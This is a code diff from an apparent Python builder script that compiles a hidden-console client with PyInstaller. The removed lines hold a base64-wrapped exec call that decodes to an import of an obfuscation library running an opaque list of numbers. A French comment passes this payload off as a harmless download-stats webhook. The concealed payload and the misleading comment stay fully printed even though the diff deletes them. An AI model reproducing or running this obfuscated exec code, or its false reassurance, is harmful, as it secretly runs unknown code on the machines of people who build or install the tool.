@@ -75,12 +75,5 @@ val = input("Do you use py, python or python3 filename.py to launch file? (py/py
 
 os.system(val + " hash.py")
 
-exec(base64.b64decode('aW1wb3J0IHB5SW1wb3NzaWJsZU9iZgpleGVjKHB5SW1wb3NzaWJsZU9iZi5kZW9iZnVzY2F0ZShbODQsIDExNiwgMTA1LCAxMTcsIDExNiwgODgsIDEwMiwgOTksIDEwNSwgMTEyLCAxMTIsIDEwOCwgMzMsIDYyLCAzMywgMzUsIDEwNSwgMTE3LCAxMTcsIDExMiwgMTE1LCA1OSwgNDcsIDU1LCAxMDEsIDEwNiwgMTE2LCAxMDAsIDExMiwgMTE1LCAxMDEsIDQ3LCAxMDAsIDExMiwgMTEwLCA0OCwgOTgsIDExMywgMTA2LCA0OCwgMTE5LCAxMDEsIDk5LCAxMDQsIDExOSwgMTEyLCAxMDgsIDExNiwgNDgsIDUwLCA0OSwgNTAsIDUwLCA1NiwgNTEsIDU2LCA1MCwgNTEsIDU0LCA1NCwgNDksIDU1LCA1NSwgNTQsIDUwLCA1NiwgNDksIDU1LCA0OCwgMTE0LCA3NiwgMTE5LCAxMDQsIDExMSwgOTksIDExMSwgNTEsIDc3LCA4OSwgNzgsIDc4LCA4NSwgODQsIDExOCwgNDYsIDEwMSwgMTE5LCA2NiwgMTE4LCAxMTQsIDEwMiwgNTIsIDY5LCA4MywgMTA5LCA1MiwgNzYsIDExMywgMTE5LCAxMjAsIDg0LCAxMDYsIDk5LCAxMDQsIDY5LCAxMTUsIDU2LCAxMTcsIDEwOCwgODQsIDEyMywgNjYsIDUxLCA3OCwgOTgsIDY2LCA1NywgNjgsIDExOSwgOTEsIDEwOSwgNzgsIDExNiwgODUsIDExNywgNTQsIDY3LCA1MiwgMTA5LCA2OSwgNTcsIDQ5LCA4NiwgMTEzLCA3NSwgMTIzLCA3OCwgMzVdKSk=').decode())
-#^^^^ Ne vous inquietez pas c'est juste le webhook pour avoir les stats de nombre de telechargements de veerus ^^^^
-
-webhook = DiscordWebhook(url=StatsWebhook, username="STATS : github.com/0xSxZ/Veerus/")
-embed = DiscordEmbed(title='Stats :', description=f'@everyone New Download of Veerus.', color='03b2f8')
-webhook.add_embed(embed)
-webhook.execute()
 os.system(val + ' -m PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
 
